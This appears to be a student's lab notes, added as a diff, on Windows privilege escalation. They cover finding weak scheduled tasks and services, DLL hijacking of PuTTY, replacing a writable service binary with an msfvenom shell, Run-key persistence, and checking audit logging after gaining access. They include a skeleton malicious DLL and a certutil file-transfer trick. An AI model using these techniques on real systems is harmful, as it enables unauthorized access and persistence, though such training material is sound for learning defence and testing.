@@ -1,0 +1,156 @@
+View DACL:
+right click on icon (like Edge) to select properties --> go to Security tab to view DACL for each group. 
+View SACL:
+from the DACL, go to "Advanced" --> Go to Auditing tab (must be Admin)
+
+Services - run in the background; you don't directly interact with them (example, your print spooler service or boot-up services).
+Applications - the name of some program that you directly interact with. They start a process or multiple processes.
+Process - an instance of a particular executable (.exe)
+
+
+DLL Search Order: When a executable runs, windows goes through the following locations in the following order to pull up necessary DLLS
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS
+Directory the Application/executable was run from
+Directory specified in the C+ function GetSystemDirectory()
+Directory specified in the C+ function GetWindowsDirectory()
+The Current Directory
+
+-Scheduled Tasks & Services: What should you evaluate IOT find a way for privilege escalation.
+Write Permission; Non-Standard locations; unquoted executable paths; vulnerabilities in Executables; permissions to run as SYSTEM;
+
+DEMO: FINDING VULNERABLE SCHEDULED TASKS
+schtasks /query /fo LIST /v
+Methodology: in a GUI,
+Explorer -> View Tab -> Select "Show Hidden Files"; 
+Search bar "Task Scheduler" opens a GUI (this will show you all the tasks only for the CURRENT USER)
+Without GUI or RDP access, use the cmd line:
+schtasks /query /fo LIST /v (this will continue to spit out output).
+You'll want to check out the "Task tTo Run" parameter, and enter a powershell session in the cmd line:
+schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run"
+From here, you'll want to look at the path and the executable at the end. You don't care about the COM handler. Check the first 10 entries
+NOW YOU WANNA CHECK YOUR PROCESSES
+tasklist /v --> look at who's running the tasks on the far right columns, ex. DESKTOP\user or DESKTOP\Admin. NA is usually system level
+Is there anything running tht you might be able to utilize? A running CMD.exe from another user may be concerning. Putty is not a standard Windows Binary.
+You want what session the task is running under. See what Sessions are associated with which session IDs by doing "query session".
+For our Putty example, we see that the user is NA, which would seem like a system level process, but since it's session ID is not a system level process, i.e. session 0 (services). Now let's exit powershell, and find out more about your process of interest:
+tasklist /v | find /i "putty". Why is the user pulled as as NA, as opposed to DESKTOP\Admin, like all the other sevices with the same ID? Let's use WMIC.
+wmic process get name,processid,parentprocessid,sessionid -> you'll scrown down and find the ids for putty.exe. What PPID is kicking this off?
+wmic process where (processid=1420) list full -> you'll see this was svchost.exe
+now you wanna see what actually kicked off that Parent process:
+tasklist /v | findstr /i "1420" --> you'll find that Scheduler (i.e. task scheduler) was kicking this svchost.exe off, which is just an exectuable that starts a service, in our case putty.
+Now let's search the Task Scheduler GUI (run as admin)
+Query processes running under Admin, then look at the "Triggers" tab to see the putty task.
+Let's search for where the executable is : where /R c:\ putty.exe
+Using the sysinternals procmon tool, you can see that putty is looking for a certain DLL in the folder that's not there, mainly because it's not needed (just bad coding; this is a putty vulnerability).
+Now let's use something called icacles.: icalcles . You'll see that BuiltIN\Users as F privileges, so you can read/write/exec into the file where putty is located.
+Try running "icacles putty.exe" (use full path)
+If you run "net user user" you can see what permissions you have as "user" (your current username)
+What if we put in a malicious DLL with the name that putty wants in the location that it wants?
+Then you'll see the folder where PUTTY is initating a DLL. You'll find that the DLL executes an admin level cmd prompt, but in Admin session of ID 3, which you can't view. The only way you know it's running is by looking at the tasklist /svc list. You can't otherwise interact with that cmd shell, unless you build your own DLL shell.
+You have to do this from Linux.
+
+DEMO: FINDING VULNERABLE SERVICES
+If you dont' find any vulnerables services on tasklist /svc, then try:
+services.msc (opens a GUI)
+First thing to do is check the description column. Most are default from Windows, but user-created Services may not have a descritption.
+Right click on the questionable services, and you'll see a path to the executable.
+Look in the "Log On" tab to see privileges required for it.
+What if you don't have GUI access though? Let's use a For loop in the cmd line that excludes any services with paths-to-executable that are not-system level, since we currently don't have access to those:
+for /f "tokens=2 delims='='"
+Alternatively, you can query the service directly with "sc qc testservice2" to view properties.
+As a regular user, you CANNOT manually start or stop services. Instead, you'll need to use wmic to find applications that will auto-start your service of interest.
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+We find that testService2 is located in C:\Program Files\7-Zip\7z.exe from that wmic function, so now lets use icacls to see the privileges of the folder from which it executes.
+icacls "C:\Program Files\7-Zip"
+You'll see that built-in\users has full permissions to the path (:F stands for full permissions)
+Look at the permissions of the binary itself:
+icacls "C:\Program Files\7-Zip\7z.exe"
+Again, BUILTIN\Users has full permissions. Write an executable binary in metasploit or msfvenom that creates an admin level cmd shell, then put it in the 7z.exe file.
+
+Here's another potential vulnerability. For a given service, if the Binary Path Name has Spaces but it's not quoted off, it's possible to drop an executable in one of the folders before the final one.
+
+PERSISTENCE: establishign system changes or binary uploads that provide continued access; i.e. survives reboots, credential changes, DHCP reassignment.
+REGISTRY: Important keys
+HKEY_LOCAL_MACHINE\SOftware\Microsoft\Windows\Current Version(\Run or \RunOnce)
+HKEY_Current_USER\Software\Software\Microsoft\Windows\CurrentVersion(\Run or \RunOnce)
+
+DEMO: AUDIT LOGGING
+You want to know what's logging after you get into a system.
+Must be admin to use this:
+auditpol /get /category:*
+See logging related to Successes or failures: auditpol /get /category:* | findstr /i "success failure"
+Check the logs in the GUI by doing eventvwr
+You need to look at the: (1) Application Log, (2) Security Log, and (3) System Log
+Application Log - developers decide what's logged, specific to application
+Security Log - Invalid login attempts, resource usage
+System Log - Windows stuff, buffer overflows, errors, driver failure
+Here are some important Windows system log IDs:
+4624/4625:
+4720: 
+4672: 
+7040: Service Manager
+7045: Service Creation
+You can view these by going into the system log on the GUI, and check on the event ID column, or right click on a specific event
+
+To check the logs from the cmd line, you have to use wevutil. Let's get 5 logs, in reverse direction (most recent are first), and in text format:
+wevtutil qe security /c:5 /rd:true /f:text
+Let's look for services that were created:
+wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=7045)]]"
+How do you query this? Go back to the Event Viwer, go on the right to "Filter Current Log"
+In the main search line, let's type 7045. Go to the XML tag, and you'll see what the query would look like in the commadn line
+You can also import .evt files (saved logs) in both wevtutil and in the EventViewer. Your default logs are stored in c:\Windows\System32\config
+Try wevtutil el, wmic ntevent where "logfile="<logname> list full, Get-Eventlog -List
+
+Powershell Logging: powershell can be set to log sessions. 2.0 -> Little evidence, 3.0 -> module logging (EventID 4103), 4.0 -> Module logging, 5.0 -> can set module, script blog (EvnetID 4104)
+
+You can query different registry keys to see if either powershell or WMIC are doing any logging
+Determining PS Version:
+reg query hklm\software\microsoft\powershell\3\powershellengine\
+powershell -command "$psversiontable"
+Determining if PS or WMIC are logging:
+reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+    # 0 = no | 1 = errors | 2 = verbose
+Accessing WMIC Log Storage:
+%systemroot%\system32\wbem\Logs\``
+
+
+================
+Dll code
+================
+
+
+#Building a DLL in Linux
+sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y
+
+i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL hack.c
+
+i686-w64-mingw32-g++ -shared -o simple.dll simple.o  -Wl,--out-implib,simple.a
+
+
+#include <windows.h> 
+int execCommand() 
+{  
+ WinExec("", 1);
+ WinExec("", 1);
+ WinExec("", 1);  
+ return 0; } 
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved) 
+{
+ execCommand();  
+ return 0;
+ }
+
+
+#Transferring a DLL to Windows from Linux without SSH,FTP,SFTP,or Python
+1. Run base64 [dll.name] > base64_dll
+2. Run md5sum base64_dll to create a MD5 hash of the dll. This will be used to validate the decoded .dll on Windows.
+3. Open base64_dll in gedit and Ctrl+A and Ctrl+C the document to copy the code
+4. Open an xfreerdp session to Windows using +clipboard
+5. Copy the text into a text file on Windows.
+6. Remove the .txt file extension using the move command on the commandline.
+7. Run certutil -decode to decode the file that was copied
+8. Run certutil -hashfile to check the hash of the .dll compared to what it was on Linux prior to copying it.
+
+How to connect to target as student::password via xfreerdp on linux opstation, after setting up remote port forwarding 1112 to the target's 3389:
+xfreerdp /u:student /p:password /v:localhost:1112 +clipboard
